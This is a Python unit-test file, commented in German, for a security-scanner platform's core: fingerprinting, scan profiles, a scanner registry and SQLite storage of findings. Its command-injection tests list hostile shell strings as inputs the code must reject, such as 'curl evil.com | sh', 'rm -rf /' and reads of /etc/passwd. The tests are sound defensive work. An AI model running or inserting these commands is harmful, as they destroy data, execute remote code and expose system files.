"""Unit-Tests fuer das Security-Core-Fundament (Task 1):
Domain-Modell, SQLite-Persistenz, Scanner-Adapter-Interface, Registry.
"""

from __future__ import annotations


import pytest

from modules.security.fingerprint import compute_fingerprint
from modules.security.models import (
    Finding,
    FindingStatus,
    ScanRun,
    ScanRunStatus,
    ScanProfileKind,
    SecurityTarget,
    Severity,
    TargetType,
    TriggerType,
)
from modules.security.scanner_adapter import ExecutionSpec
from modules.security.scanner_registry import (
    BUILTIN_SCAN_PROFILES,
    ScannerRegistry,
    UnknownScannerError,
    get_scan_profile,
    scanner_allowed_in_profile,
)

pytestmark = pytest.mark.unit


# ── Fingerprint / Dedupe ─────────────────────────────────────────────────


def test_fingerprint_is_stable_for_identical_inputs():
    fp1 = compute_fingerprint(scanner_id="trivy", target_id="t1", rule_id="CVE-2024-1", resource_identifier="libfoo")
    fp2 = compute_fingerprint(scanner_id="trivy", target_id="t1", rule_id="CVE-2024-1", resource_identifier="libfoo")
    assert fp1 == fp2


def test_fingerprint_differs_for_different_rule():
    fp1 = compute_fingerprint(scanner_id="trivy", target_id="t1", rule_id="CVE-2024-1")
    fp2 = compute_fingerprint(scanner_id="trivy", target_id="t1", rule_id="CVE-2024-2")
    assert fp1 != fp2


def test_fingerprint_case_insensitive_normalization():
    fp1 = compute_fingerprint(scanner_id="Trivy", target_id="T1", rule_id="cve-2024-1")
    fp2 = compute_fingerprint(scanner_id="trivy", target_id="t1", rule_id="CVE-2024-1")
    assert fp1 == fp2


# ── ExecutionSpec: Command-Injection-Schutz ──────────────────────────────


def test_execution_spec_accepts_argument_array():
    spec = ExecutionSpec(
        scanner_id="trivy",
        container_image="aquasec/trivy:0.55.0",
        command=["trivy", "image", "--format", "json", "registry.local/foo:latest"],
    )
    spec.assert_no_shell_string()  # darf nicht werfen


@pytest.mark.parametrize(
    "malicious",
    [
        ["trivy image; rm -rf /"],
        ["trivy && curl evil.com | sh"],
        ["trivy $(cat /etc/passwd)"],
        ["trivy `whoami`"],
    ],
)
def test_execution_spec_rejects_shell_string_lookalikes(malicious):
    spec = ExecutionSpec(scanner_id="trivy", container_image="x", command=malicious)
    with pytest.raises(ValueError):
        spec.assert_no_shell_string()


@pytest.mark.parametrize(
    "malicious",
    [
        ["sh", "-c", "curl evil.com | sh"],
        ["/bin/bash", "-c", "rm -rf /"],
        ["bash", "-lc", "cat /etc/passwd"],
    ],
)
def test_execution_spec_rejects_disguised_shell_invocation(malicious):
    """Regressionstest: assert_no_shell_string() muss auch einen mehrelementigen
    Aufruf eines Shell-Interpreters mit -c erkennen, nicht nur ein einzelnes
    Element mit Shell-Metazeichen — sonst waere die 'strukturell unmoeglich'-
    Garantie fuer diesen Fall nur behauptet, nicht durchgesetzt."""
    spec = ExecutionSpec(scanner_id="trivy", container_image="x", command=malicious)
    with pytest.raises(ValueError):
        spec.assert_no_shell_string()


def test_execution_spec_default_resource_limits_present():
    spec = ExecutionSpec(scanner_id="trivy", container_image="x", command=["trivy", "image"])
    assert "cpu" in spec.resource_limits
    assert "memory" in spec.resource_limits
    assert spec.service_account == "ninko-security-scanner"


# ── Scan-Profile: Passive/Standard/Intrusive ─────────────────────────────


def test_intrusive_profile_forbids_scheduling():
    profile = get_scan_profile("intrusive")
    assert profile.kind == ScanProfileKind.INTRUSIVE
    assert profile.allow_scheduling is False
    assert profile.requires_approval is True


def test_passive_profile_allows_scheduling_and_no_approval():
    profile = get_scan_profile("passive")
    assert profile.allow_scheduling is True
    assert profile.requires_approval is False


def test_unknown_scan_profile_raises():
    with pytest.raises(ValueError):
        get_scan_profile("does-not-exist")


def test_scanner_allowed_in_profile():
    assert scanner_allowed_in_profile("trivy", "passive") is True
    assert scanner_allowed_in_profile("garak", "passive") is False
    assert scanner_allowed_in_profile("garak", "intrusive") is True


def test_all_builtin_profiles_have_non_empty_allowlist():
    for profile in BUILTIN_SCAN_PROFILES.values():
        assert profile.allowed_scanner_ids, f"Profil {profile.id} hat keine erlaubten Scanner"


# ── Scanner Registry ──────────────────────────────────────────────────────


def test_unregistered_scanner_is_rejected():
    registry = ScannerRegistry()
    with pytest.raises(UnknownScannerError):
        registry.get_definition("nmap")
    with pytest.raises(UnknownScannerError):
        registry.get_adapter("nmap")


def test_registry_definition_adapter_id_mismatch_rejected():
    from modules.security.models import ScannerCategory, ScannerDefinition

    class _FakeAdapter:
        scanner_id = "wrong-id"

    registry = ScannerRegistry()
    definition = ScannerDefinition(
        id="trivy", name="Trivy", category=ScannerCategory.CONTAINER_SUPPLY_CHAIN,
        container_image="aquasec/trivy:0.55.0",
    )
    with pytest.raises(ValueError):
        registry.register(definition, _FakeAdapter())  # type: ignore[arg-type]


def test_registry_list_definitions_excludes_disabled_by_default():
    from modules.security.models import ScannerCategory, ScannerDefinition

    class _FakeAdapter:
        scanner_id = "disabled-scanner"

    registry = ScannerRegistry()
    definition = ScannerDefinition(
        id="disabled-scanner", name="Disabled", category=ScannerCategory.HOST,
        container_image="x:1", enabled=False,
    )
    registry.register(definition, _FakeAdapter())  # type: ignore[arg-type]
    assert registry.list_definitions(enabled_only=True) == []
    assert len(registry.list_definitions(enabled_only=False)) == 1


# ── SQLite-Persistenz ─────────────────────────────────────────────────────


@pytest.fixture
def security_db(tmp_path, monkeypatch):
    """Isolierte SQLite-DB pro Test — kein State-Leck zwischen Tests."""
    monkeypatch.setenv("DATA_DIR", str(tmp_path))
    import core.config as core_config

    core_config._settings = None  # erzwingt Re-Read der Env-Vars

    from modules.security import db as security_db_module

    security_db_module._db_path = None
    security_db_module._init_event = None

    yield security_db_module

    security_db_module._db_path = None
    security_db_module._init_event = None
    core_config._settings = None


@pytest.mark.asyncio
async def test_create_and_get_target(security_db):
    target = SecurityTarget(
        name="prod-cluster", target_type=TargetType.KUBERNETES_NAMESPACE, locator="ai-platform",
        tenant_id="t1",
    )
    await security_db.create_target(target)
    fetched = await security_db.get_target(target.id, tenant_id="t1")
    assert fetched is not None
    assert fetched.name == "prod-cluster"
    assert fetched.target_type == TargetType.KUBERNETES_NAMESPACE


@pytest.mark.asyncio
async def test_target_tenant_isolation(security_db):
    target = SecurityTarget(name="t", target_type=TargetType.URL, locator="https://example.com", tenant_id="tenant-a")
    await security_db.create_target(target)
    assert await security_db.get_target(target.id, tenant_id="tenant-b") is None
    assert await security_db.get_target(target.id, tenant_id="tenant-a") is not None


@pytest.mark.asyncio
async def test_scan_run_lifecycle(security_db):
    run = ScanRun(
        target_id="target-1", scanner_id="trivy", profile_id="passive",
        trigger_type=TriggerType.MANUAL, status=ScanRunStatus.QUEUED,
    )
    await security_db.create_scan_run(run)

    updated = await security_db.update_scan_run(run.id, status=ScanRunStatus.RUNNING, started_at=1234.0)
    assert updated is not None
    assert updated.status == ScanRunStatus.RUNNING
    assert updated.started_at == 1234.0

    fetched = await security_db.get_scan_run(run.id)
    assert fetched.status == ScanRunStatus.RUNNING


@pytest.mark.asyncio
async def test_scan_run_update_rejects_unknown_field(security_db):
    run = ScanRun(target_id="t", scanner_id="trivy", profile_id="passive")
    await security_db.create_scan_run(run)
    with pytest.raises(ValueError):
        await security_db.update_scan_run(run.id, not_a_real_field="x")


@pytest.mark.asyncio
async def test_upsert_finding_creates_then_dedupes(security_db):
    fp = compute_fingerprint(scanner_id="trivy", target_id="target-1", rule_id="CVE-2024-9999")
    finding = Finding(
        scan_run_id="run-1", target_id="target-1", fingerprint=fp, scanner_id="trivy",
        title="Vulnerable libfoo", severity=Severity.HIGH, original_severity=Severity.HIGH,
    )
    created, is_new = await security_db.upsert_finding(finding)
    assert is_new is True
    assert created.occurrence_count == 1

    finding_again = Finding(
        scan_run_id="run-2", target_id="target-1", fingerprint=fp, scanner_id="trivy",
        title="Vulnerable libfoo", severity=Severity.HIGH, original_severity=Severity.HIGH,
    )
    updated, is_new_2 = await security_db.upsert_finding(finding_again)
    assert is_new_2 is False
    assert updated.occurrence_count == 2
    assert updated.scan_run_id == "run-2"


@pytest.mark.asyncio
async def test_upsert_finding_reopens_resolved(security_db):
    fp = compute_fingerprint(scanner_id="trivy", target_id="target-1", rule_id="CVE-2024-1")
    finding = Finding(
        scan_run_id="run-1", target_id="target-1", fingerprint=fp, scanner_id="trivy",
        title="X", severity=Severity.HIGH, original_severity=Severity.HIGH,
        status=FindingStatus.RESOLVED,
    )
    await security_db.upsert_finding(finding)

    reappeared = Finding(
        scan_run_id="run-2", target_id="target-1", fingerprint=fp, scanner_id="trivy",
        title="X", severity=Severity.HIGH, original_severity=Severity.HIGH,
    )
    updated, _ = await security_db.upsert_finding(reappeared)
    assert updated.status == FindingStatus.REOPENED


@pytest.mark.asyncio
async def test_upsert_finding_keeps_false_positive_decision(security_db):
    """Ein bewusst als False Positive markiertes Finding darf nicht automatisch
    durch einen erneuten Scan-Treffer ueberschrieben werden."""
    fp = compute_fingerprint(scanner_id="trivy", target_id="target-1", rule_id="CVE-2024-1")
    finding = Finding(
        scan_run_id="run-1", target_id="target-1", fingerprint=fp, scanner_id="trivy",
        title="X", severity=Severity.LOW, original_severity=Severity.LOW,
        status=FindingStatus.FALSE_POSITIVE,
    )
    await security_db.upsert_finding(finding)

    reappeared = Finding(
        scan_run_id="run-2", target_id="target-1", fingerprint=fp, scanner_id="trivy",
        title="X", severity=Severity.LOW, original_severity=Severity.LOW,
    )
    updated, _ = await security_db.upsert_finding(reappeared)
    assert updated.status == FindingStatus.FALSE_POSITIVE


@pytest.mark.asyncio
async def test_mark_absent_findings_resolved(security_db):
    fp1 = compute_fingerprint(scanner_id="trivy", target_id="t1", rule_id="CVE-1")
    fp2 = compute_fingerprint(scanner_id="trivy", target_id="t1", rule_id="CVE-2")
    f1 = Finding(scan_run_id="run-1", target_id="t1", fingerprint=fp1, scanner_id="trivy",
                 title="A", severity=Severity.HIGH, original_severity=Severity.HIGH)
    f2 = Finding(scan_run_id="run-1", target_id="t1", fingerprint=fp2, scanner_id="trivy",
                 title="B", severity=Severity.HIGH, original_severity=Severity.HIGH)
    created1, _ = await security_db.upsert_finding(f1)
    created2, _ = await security_db.upsert_finding(f2)

    # Zweiter Run findet nur noch f1 -> f2 muss resolved werden.
    resolved_count = await security_db.mark_absent_findings_resolved(
        "run-2", {created1.id}, target_id="t1", scanner_id="trivy"
    )
    assert resolved_count == 1
    f2_after = await security_db.get_finding(created2.id)
    assert f2_after.status == FindingStatus.RESOLVED


@pytest.mark.asyncio
async def test_list_findings_filters_by_severity_and_status(security_db):
    for sev in (Severity.LOW, Severity.HIGH, Severity.CRITICAL):
        fp = compute_fingerprint(scanner_id="trivy", target_id="t1", rule_id=f"RULE-{sev.value}")
        finding = Finding(
            scan_run_id="run-1", target_id="t1", fingerprint=fp, scanner_id="trivy",
            title=f"Finding {sev.value}", severity=sev, original_severity=sev,
        )
        await security_db.upsert_finding(finding)

    high_only = await security_db.list_findings(severity=Severity.HIGH)
    assert len(high_only) == 1
    assert high_only[0].severity == Severity.HIGH

    new_only = await security_db.list_findings(status=FindingStatus.NEW)
    assert len(new_only) == 3
